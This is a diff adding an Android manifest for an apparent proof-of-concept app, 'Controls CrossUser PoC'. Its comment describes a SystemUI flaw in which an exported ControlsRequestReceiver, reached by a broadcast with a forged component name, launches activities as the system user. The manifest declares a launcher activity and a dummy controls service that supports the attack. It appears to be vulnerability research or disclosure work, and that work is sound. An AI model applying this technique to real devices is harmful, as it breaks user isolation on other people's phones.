@@ -1,0 +1,43 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.poc.controlsleak">
+
+    <!--
+        V-349: SystemUI ControlsRequestReceiver Cross-User Activity Launch
+
+        PERMISSIONS REQUIRED: NONE
+        The ControlsRequestReceiver is exported with no permission requirement.
+        Sending a broadcast with a forged EXTRA_COMPONENT_NAME pointing to own
+        foreground package triggers startActivityAsUser(intent, UserHandle.SYSTEM).
+    -->
+
+    <uses-sdk android:minSdkVersion="30" android:targetSdkVersion="35" />
+
+    <application
+        android:label="Controls CrossUser PoC"
+        android:icon="@android:drawable/ic_dialog_alert"
+        android:theme="@android:style/Theme.Material.Light.NoActionBar">
+
+        <activity
+            android:name=".MainActivity"
+            android:exported="true"
+            android:label="Controls CrossUser PoC">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <!-- Dummy ControlsProviderService to make the ComponentName valid -->
+        <service
+            android:name=".DummyControlsService"
+            android:exported="true"
+            android:permission="android.permission.BIND_CONTROLS">
+            <intent-filter>
+                <action android:name="android.service.controls.ControlsProviderService" />
+            </intent-filter>
+        </service>
+
+    </application>
+
+</manifest>
